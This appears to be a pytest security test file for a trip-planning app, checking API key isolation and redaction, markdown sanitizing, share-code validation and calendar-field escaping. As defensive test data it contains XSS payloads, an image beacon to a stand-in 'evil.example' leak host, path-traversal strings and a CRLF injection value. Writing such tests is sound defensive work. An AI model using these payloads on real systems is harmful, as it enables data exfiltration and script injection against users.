"""Security tests: bring-your-own key handling, isolation, redaction, safe rendering, sharing, profiles."""
import json
import os

import sys
from pathlib import Path

os.environ["AZ_OFFLINE"] = "1"
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

import pytest  # noqa: E402

from azmulti import llm, shared  # noqa: E402
from azmulti.graph import Planner  # noqa: E402
from azmulti.security import redact, safe_url, sanitize_markdown, valid_key_format  # noqa: E402

KEY_A = "sk-proj-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1111"
KEY_B = "sk-proj-BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB2222"
TRIP = "Saturday in Tempe for 3 friends, $80 each, museum and pizza"


class FakeLLM:
    """Stands in for ChatOpenAI: records which key it was built with, then fails like a 401 that echoes the key."""
    calls: list = []

    def __init__(self, key):
        self.key = key

    def with_structured_output(self, schema):
        FakeLLM.calls.append(self.key)
        raise RuntimeError(f"Error code: 401 - Incorrect API key provided: {self.key}")

    def invoke(self, msgs):
        FakeLLM.calls.append(self.key)
        raise RuntimeError(f"Error code: 401 - invalid_api_key {self.key}")


@pytest.fixture()
def byok(monkeypatch, tmp_path):
    monkeypatch.setenv("AZ_OFFLINE", "0")
    monkeypatch.setenv("AZ_WEATHER", "off")
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    for k in ("GOOGLE_PLACES_API_KEY", "TICKETMASTER_API_KEY", "TAVILY_API_KEY", "TOMTOM_API_KEY"):
        monkeypatch.delenv(k, raising=False)
    monkeypatch.setattr(llm, "_make_client", lambda key, t: FakeLLM(key))
    llm._CLIENTS.clear()
    FakeLLM.calls = []
    monkeypatch.setattr(shared, "SHARED_DIR", tmp_path / "shared")
    yield tmp_path


def test_key_format_and_masking():
    assert valid_key_format(KEY_A) and not valid_key_format("hello") and not valid_key_format("sk-short")
    p = Planner()
    p.set_api_key(KEY_A)
    assert p.api_key_hint == "key added (hidden)" and "1111" not in p.api_key_hint and KEY_A not in repr(p)
    state = p.__getstate__()  # what a host would serialize: no key, no PIN
    assert "_api_key" not in state and "_pin" not in state and KEY_A not in str(state)


def test_each_session_uses_only_its_own_key(byok):
    a, b, c = Planner(), Planner(), Planner()
    a.set_api_key(KEY_A)
    b.set_api_key(KEY_B)
    a.ask(TRIP)
    assert set(FakeLLM.calls) == {KEY_A}
    FakeLLM.calls = []
    b.ask(TRIP)
    assert set(FakeLLM.calls) == {KEY_B}
    FakeLLM.calls = []
    c.ask(TRIP)  # no key, no server key -> no OpenAI calls at all
    assert FakeLLM.calls == []


def test_bad_key_is_reported_redacted_and_not_retried(byok, caplog):
    p = Planner()
    p.set_api_key(KEY_A)
    out = p.ask(TRIP)
    assert out["llm_errors"] == ["Your OpenAI key was rejected (invalid or revoked)."]
    assert len(FakeLLM.calls) == 1            # stops after the first rejection
    assert out["intent"] == "new_plan"        # still plans with the offline rules
    assert KEY_A not in caplog.text and "[redacted]" in caplog.text


def test_key_never_persisted_anywhere(byok):
    p = Planner()
    p.set_api_key(KEY_A)
    p.ask(TRIP)
    code = p.share("Tester")
    p.ask("swap dinner for something cheaper")
    blob = json.dumps(p.state(), default=str)
    assert KEY_A not in blob
    for f in Path(byok).rglob("*"):
        if f.is_file():
            assert KEY_A not in f.read_text(encoding="utf-8", errors="ignore")
    assert shared.valid_code(code)


def test_key_pasted_in_chat_is_ignored(byok):
    p = Planner()
    p.ask(TRIP)
    out = p.ask(f"here is my key {KEY_A}")
    assert "ignored that message" in out["answer"]
    assert KEY_A not in json.dumps(p.state(), default=str)
    assert FakeLLM.calls == []


def test_server_key_not_used_when_user_key_required(byok, monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", KEY_B)
    monkeypatch.setenv("AZ_REQUIRE_USER_KEY", "1")
    import azmulti.config as C
    monkeypatch.setattr(C, "USE_LLM", True)
    Planner().ask(TRIP)
    assert FakeLLM.calls == []


def test_redaction():
    s = redact(f"Bearer {KEY_A} and https://x.com/?apikey=abcdef123456789 and tvly-abcdefghijklmnop")
    assert KEY_A not in s and "abcdef123456789" not in s and "tvly-abcdefghij" not in s


@pytest.mark.parametrize("bad,banned", [
    ("![x](https://evil.example/leak?d=secret)", "evil.example"),
    ("<script>alert(1)</script>hi", "<script"),
    ("<img src=x onerror=alert(1)>", "onerror"),
    ("[click](javascript:alert(1))", "javascript:"),
    ("[data](data:text/html;base64,AAAA)", "data:"),
])
def test_markdown_sanitizer_blocks_injection(bad, banned):
    assert banned not in sanitize_markdown(bad)


def test_markdown_sanitizer_keeps_normal_links():
    assert sanitize_markdown("[Maps](https://www.google.com/maps/dir/?api=1)") == "[Maps](https://www.google.com/maps/dir/?api=1)"
    assert safe_url("javascript:alert(1)") is None and safe_url("https://ok.example/a") == "https://ok.example/a"


def test_share_codes_are_long_random_and_validated(byok):
    codes = {shared.new_code() for _ in range(200)}
    assert len(codes) == 200 and all(shared.valid_code(c) and len(c) == 12 for c in codes)
    for bad in ("../../etc/passwd", "SAG-1234", "SAG-AAAAAAAA/../x", "", None):
        assert shared.load(bad) is None
    with pytest.raises(ValueError):
        shared.save("../evil", {})


def test_shared_names_are_cleaned(byok):
    p = Planner()
    p.ask(TRIP)
    code = p.share("<b>Mallory</b>![x](https://evil)")
    rec = shared.load(code)
    assert not set(rec["editor"]) & set("<>()[]!:/\\`*_#") and len(rec["editor"]) <= 30  # plain text only


def test_ics_cannot_be_injected():
    from azmulti.agents.concierge import _ics
    assert "\n" not in _ics("Cafe\r\nATTENDEE:mailto:x@evil.com") and "\\;" in _ics("a;b")
